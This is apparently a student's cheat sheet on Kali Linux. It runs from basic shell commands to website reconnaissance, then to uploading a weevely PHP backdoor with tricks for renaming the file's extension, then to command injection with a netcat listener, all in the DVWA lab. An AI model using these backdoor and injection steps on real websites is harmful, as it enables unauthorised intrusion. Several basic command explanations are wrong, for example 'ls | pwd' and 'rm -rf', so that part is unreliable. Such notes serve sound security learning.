
# kali linux commands

- prints current working directry, uses to redirect to open a file - `pwd`  
- list all files - `ls`
- list of all files in the directory with details - `ls -la`
- open a folder - `cd`
- previous folder - `..`  
- prints descrption of a function - `man`   
-  Delete a file `rm -rf` 
- used to update like (winget in windows) - `sudo apt-get update` 
- upgrade kali linux - `sudo apt upgrade` 
- update kali linux - `sudo apt update`
- run 2 commands concurently -  `ls;pwd`
- run the 2nd command directly by neglecting the first commands - `ls | pwd `
- 
<h3 align="center"> ... </h3>  

## check IP address


- to check the information of the target website  
```
http://whois.domaintools.com/
```
- to check which techonology is used in target website  
```
http://toolbar.netcraft.com/site_report?url=
```

- which which website have same ipaddress  

>if we can hack into 1 we can hack all the other

```
https://www.robtex.com/ 
```  
- Using bing.com, search for `ip: [target ip]`
- <h3 align="center"> ... </h3> 
## FileUploadVulnerability
- weevely is a tool used for opening the backdoors and to access the website.
```
weevely generate 123456 /root/shell.php
```
- this creates a php file which is used to upload and open backdoors
- after uploading, run the following command
- `weevely (respective url) 123456`
- now from the terminal we can open the backdoor that is  `cd ..` to get back and then we can access as we want.
- burpsuite is used to interpt the website being executed with the help of proxy.

> low - any file can be uploaded i.e., shell.php
>
> medium - we remame the file from shell.php to shell.jepg i.e., shell.jpeg and upload it using bruiteforce by changing the file type to php.
>
> high - we change the file type to shell.php.jpeg and upload and then expoit.


<h3 align="center"> ... </h3> 

## Code Execution Vulnerability

- open any searchable website (dvwa- command execution)
- run the following command
```
nc -vv -l -p 8080
```
![Screenshot 2024-04-09 232801](https://github.com/stellados53/kali_commands/assets/142677726/7d1cc4d5-5310-4934-84ba-2c44d0124a0e)

> nc   = netcat tool this is used to use and connect the computer to the website.
> 
> -vv  = it is just a verbose mode, which retireve more output.
> 
> -l   = Listen mode, used to create a server that listens for incoming connections.
> 
> -p   = Specifies the source port number.
> 
> 8080 = port number.

> low - in searchbox __END WITH ";" AND RUN THE COMMAND ACCORDING TO THE WEBSITE OS.MOST IMPORTANT IF THE IP IS 192.168.11.129, SUBTRACT THE LAST NUMBER -1 THAT IS 192.168.11.128__
>
> medium - it cannot run two commands using ";" so we use "|" for the exploit.
>
> high is not even possible
